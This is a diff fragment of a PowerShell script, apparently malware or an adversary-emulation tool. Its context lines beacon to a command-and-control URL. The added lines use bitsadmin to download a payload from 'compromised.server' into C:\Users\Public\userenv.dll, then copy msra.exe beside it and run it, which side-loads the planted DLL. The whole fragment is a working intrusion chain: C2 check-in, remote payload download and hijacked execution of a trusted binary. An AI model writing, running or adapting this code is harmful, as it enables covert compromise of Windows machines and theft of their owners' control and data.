@@ -87,5 +87,25 @@ $parameter = "{0}={1}&{2}={3}&{4}={5}" -f $type, $type_value, $uid, $uid_value, 
 $url = $c2_url + $parameter
 $response = Invoke-WebRequest $url
 
+$remote_url = "http://compromised.server/payloads/test.txt"
+$local_path = "C:\Users\Public\userenv.dll"
 
+# Create a new bitsadmin job and add a file to the job
+$job_name = "FileDownload"
+$command = "bitsadmin /transfer $job_name"
+$command += " /download $remote_url $local_path"
+cmd.exe /c $command
 
+# Wait for the download to complete
+Start-Sleep -Seconds 5
+
+# Set the source file path
+$source_file_path = "C:\Windows\System32\msra.exe"
+
+# Set the destination file path
+$dst_file_path = "C:\Users\Public\msra.exe"
+
+# Copy the file to the destination folder
+Copy-Item -Path $source_file_path -Destination $dst_file_path
+
+C:\Users\Public\msra.exe
